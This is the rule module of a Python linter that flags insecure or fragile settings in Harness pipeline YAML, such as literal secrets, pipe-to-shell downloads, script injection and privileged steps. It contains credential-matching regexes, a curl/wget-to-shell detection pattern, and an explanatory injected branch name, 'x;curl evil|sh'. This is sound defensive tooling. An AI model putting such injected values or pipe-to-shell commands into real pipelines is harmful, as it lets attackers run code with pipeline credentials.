"""The rule set. Each rule is a function that yields findings for one document."""

from __future__ import annotations

import re
from collections.abc import Callable, Iterator
from dataclasses import dataclass

from .model import Doc, Node

ERROR, WARNING, INFO = "error", "warning", "info"
SEVERITY_RANK = {INFO: 0, WARNING: 1, ERROR: 2}


@dataclass(frozen=True)
class Finding:
    rule: str
    severity: str
    message: str
    file: str
    line: int
    hint: str = ""


@dataclass(frozen=True)
class Rule:
    id: str
    severity: str
    title: str
    why: str
    check: Callable[[Doc], Iterator[tuple[int, str, str]]]


RULES: dict[str, Rule] = {}


def rule(id: str, severity: str, title: str, why: str):
    def register(fn):
        RULES[id] = Rule(id, severity, title, why, fn)
        return fn

    return register


def _spec(node: Node) -> dict:
    spec = node.get("spec")
    return spec if isinstance(spec, dict) else {}


def _name(node: Node) -> str:
    return str(node.get("identifier") or node.get("name") or "?")


def _is_expr(value: object) -> bool:
    return isinstance(value, str) and value.strip().startswith("<+")


def _strings(node) -> Iterator[tuple[int, str]]:
    """Yield every string scalar with the nearest line number."""
    stack = [(node, getattr(node, "line", 1))]
    while stack:
        cur, line = stack.pop()
        if isinstance(cur, dict):
            line = getattr(cur, "line", line)
            stack += [(v, line) for v in cur.values()]
        elif isinstance(cur, list):
            stack += [(v, line) for v in cur]
        elif isinstance(cur, str):
            yield line, cur


# --- HD001 -----------------------------------------------------------------

SECRET_NAME = re.compile(r"(token|secret|passw(or)?d|api[_-]?key|private[_-]?key|credential)", re.I)
SECRET_VALUE = re.compile(
    r"(AKIA[0-9A-Z]{16}|gh[pousr]_[A-Za-z0-9]{36,}|glpat-[A-Za-z0-9_-]{20,}"
    r"|xox[baprs]-[A-Za-z0-9-]{10,}|-----BEGIN [A-Z ]*PRIVATE KEY-----)"
)


@rule(
    "HD001",
    ERROR,
    "Hardcoded secret",
    "Pipeline YAML lives in git. A literal credential there is readable by everyone with "
    "repo access and stays in history after you delete it. Use a Harness secret.",
)
def hardcoded_secret(doc: Doc):
    seen: set[int] = set()
    for step, _ in doc.steps:
        env = _spec(step).get("envVariables")
        if isinstance(env, dict):
            for key, value in env.items():
                if SECRET_NAME.search(str(key)) and isinstance(value, str) and value and not _is_expr(value):
                    seen.add(step.line)
                    yield (
                        step.line,
                        f"env var '{key}' in step '{_name(step)}' holds a literal value",
                        f'use <+secrets.getValue("{str(key).lower()}")>',
                    )
    for node in _all_nodes(doc.root):
        if node.get("type") == "String" and isinstance(node.get("name"), str):
            value = node.get("value")
            if SECRET_NAME.search(node["name"]) and isinstance(value, str) and value and not _is_expr(value):
                seen.add(node.line)
                yield (
                    node.line,
                    f"variable '{node['name']}' is a plain String with a literal value",
                    "make it type Secret and reference a Harness secret",
                )
    for line, text in _strings(doc.root):
        if line not in seen and SECRET_VALUE.search(text):
            yield line, "string looks like a real credential", "rotate it, then use a Harness secret"


def _all_nodes(node) -> Iterator[Node]:
    if isinstance(node, Node):
        yield node
        for v in node.values():
            yield from _all_nodes(v)
    elif isinstance(node, list):
        for v in node:
            yield from _all_nodes(v)


# --- HD002 -----------------------------------------------------------------

NO_TIMEOUT_NEEDED = {
    "Background", "HarnessApproval", "JiraApproval", "ServiceNowApproval", "CustomApproval",
    "Barrier", "Queue",
}


@rule(
    "HD002",
    WARNING,
    "Step without a timeout",
    "A hung step holds a runner and a deploy lock until the platform default expires. "
    "An explicit timeout makes the failure fast and the cost predictable.",
)
def missing_timeout(doc: Doc):
    for step, _ in doc.steps:
        if step.get("type") in NO_TIMEOUT_NEEDED or "template" in step:
            continue
        if "timeout" not in step:
            yield step.line, f"step '{_name(step)}' ({step.get('type', '?')}) has no timeout", "add timeout: 10m"


# --- HD003 -----------------------------------------------------------------

IMAGE_STEPS = {"Run", "Background", "Plugin", "Test"}


def _unpinned(image: str) -> str | None:
    if _is_expr(image) or "<+" in image or "@sha256:" in image:
        return None
    tail = image.rsplit("/", 1)[-1]
    if ":" not in tail:
        return "has no tag, so it resolves to latest"
    if tail.endswith(":latest"):
        return "uses the latest tag"
    return None


@rule(
    "HD003",
    WARNING,
    "Unpinned container image",
    "A moving tag means the same commit can build differently tomorrow, and a "
    "compromised upstream image reaches your pipeline with no change in git.",
)
def unpinned_image(doc: Doc):
    for step, _ in doc.steps:
        image = _spec(step).get("image")
        if step.get("type") in IMAGE_STEPS and isinstance(image, str):
            problem = _unpinned(image)
            if problem:
                yield step.line, f"image '{image}' in step '{_name(step)}' {problem}", "pin a version tag or an @sha256 digest"


# --- HD004 / HD005 ---------------------------------------------------------

APPROVAL_STEPS = {"HarnessApproval", "JiraApproval", "ServiceNowApproval", "CustomApproval"}
ROLLBACK_ACTIONS = {"StageRollback", "PipelineRollback"}


def _is_deployment(stage: Node) -> bool:
    return stage.get("type") in ("Deployment", "CustomDeployment")


def _find_values(node, wanted: str) -> Iterator[str]:
    if isinstance(node, dict):
        for k, v in node.items():
            if k == wanted and isinstance(v, str):
                yield v
            else:
                yield from _find_values(v, wanted)
    elif isinstance(node, list):
        for v in node:
            yield from _find_values(v, wanted)


@rule(
    "HD004",
    WARNING,
    "Deployment stage with no rollback path",
    "When a deploy step fails midway, the environment is left half-changed. A rollback "
    "step or a StageRollback failure strategy gets it back without a human at 3am.",
)
def no_rollback(doc: Doc):
    for stage in doc.stages:
        if not _is_deployment(stage):
            continue
        rollback_steps = _spec(stage).get("execution", {}).get("rollbackSteps") if isinstance(
            _spec(stage).get("execution"), dict
        ) else None
        actions = set(_find_values(stage.get("failureStrategies", []), "type"))
        if not rollback_steps and not (actions & ROLLBACK_ACTIONS):
            yield stage.line, f"stage '{_name(stage)}' deploys with no rollback", "add rollbackSteps or a StageRollback failure strategy"


PROD = re.compile(r"(^|[^a-z])prod(uction)?($|[^a-z])")
NOT_PROD = re.compile(r"(non|pre)[-_ ]?prod")


def _targets_prod(stage: Node) -> str | None:
    for ref in _find_values(stage, "environmentRef"):
        low = ref.lower()
        if PROD.search(low) and not NOT_PROD.search(low):
            return ref
    return None


def _has_approval(stage: Node) -> bool:
    if stage.get("type") == "Approval":
        return True
    return any(v in APPROVAL_STEPS for v in _find_values(stage, "type"))


@rule(
    "HD005",
    ERROR,
    "Production deploy without an approval gate",
    "Nothing between a merged PR and production means one bad merge is an incident. "
    "An approval stage earlier in the pipeline keeps a human in the loop.",
)
def prod_without_approval(doc: Doc):
    for index, stage in enumerate(doc.stages):
        env = _targets_prod(stage) if _is_deployment(stage) else None
        if env and not any(_has_approval(s) for s in doc.stages[: index + 1]):
            yield stage.line, f"stage '{_name(stage)}' deploys to '{env}' with no approval before it", "add a HarnessApproval stage ahead of this one"


# --- HD006 / HD007 / HD008 -------------------------------------------------

PIPE_TO_SHELL = re.compile(r"(curl|wget)\b[^|\n]*\|\s*(sudo\s+)?(ba|z|da)?sh\b")
UNTRUSTED = re.compile(
    r"<\+(trigger\.(payload\.[\w.\[\]]+|prTitle|sourceBranch|branch|commitMessage|gitUser\w*)"
    r"|codebase\.(branch|sourceBranch|prTitle|commitMessage|gitUser\w*))>"
)


def _commands(doc: Doc) -> Iterator[tuple[Node, str]]:
    for step, _ in doc.steps:
        command = _spec(step).get("command")
        if step.get("type") == "Run" and isinstance(command, str):
            yield step, command


@rule(
    "HD006",
    WARNING,
    "Pipes a download straight into a shell",
    "curl | sh runs whatever the server returns today, with the pipeline's credentials. "
    "Download, verify a checksum, then run.",
)
def pipe_to_shell(doc: Doc):
    for step, command in _commands(doc):
        if PIPE_TO_SHELL.search(command):
            yield step.line, f"step '{_name(step)}' pipes a download into a shell", "download to a file, check its sha256, then execute"


@rule(
    "HD007",
    WARNING,
    "Untrusted trigger data interpolated into a script",
    "Branch names, PR titles and commit messages are chosen by whoever opens the PR. "
    "Harness substitutes the expression into the script text before the shell parses "
    "it, so a branch named x;curl evil|sh runs as code.",
)
def script_injection(doc: Doc):
    for step, command in _commands(doc):
        match = UNTRUSTED.search(command)
        if match:
            yield (
                step.line,
                f"step '{_name(step)}' puts {match.group(0)} directly in the script",
                'pass it through envVariables and read it quoted: "$VAR"',
            )


@rule(
    "HD008",
    WARNING,
    "Privileged step",
    "A privileged container has the host's kernel capabilities. A compromised dependency "
    "in that step can escape to the runner.",
)
def privileged_step(doc: Doc):
    for step, _ in doc.steps:
        if _spec(step).get("privileged") is True:
            yield step.line, f"step '{_name(step)}' runs privileged", "drop privileged unless the step builds images with DinD"


# --- HD009 -----------------------------------------------------------------

CACHE_STEPS = {"RestoreCacheS3", "RestoreCacheGCS", "RestoreCacheHarness", "SaveCacheS3", "SaveCacheGCS", "SaveCacheHarness", "Cache"}


@rule(
    "HD009",
    INFO,
    "CI stage without caching",
    "Reinstalling dependencies on every run is the most common reason a pipeline is slow "
    "and the easiest to fix.",
)
def no_cache(doc: Doc):
    for stage in doc.stages:
        if stage.get("type") != "CI":
            continue
        caching = _spec(stage).get("caching")
        enabled = isinstance(caching, dict) and caching.get("enabled") not in (False, None)
        step_types = set(_find_values(stage, "type"))
        runs = "Run" in step_types
        if runs and not enabled and not (step_types & CACHE_STEPS):
            yield stage.line, f"CI stage '{_name(stage)}' runs steps with no caching", "set spec.caching.enabled: true or add a Save/Restore Cache step"
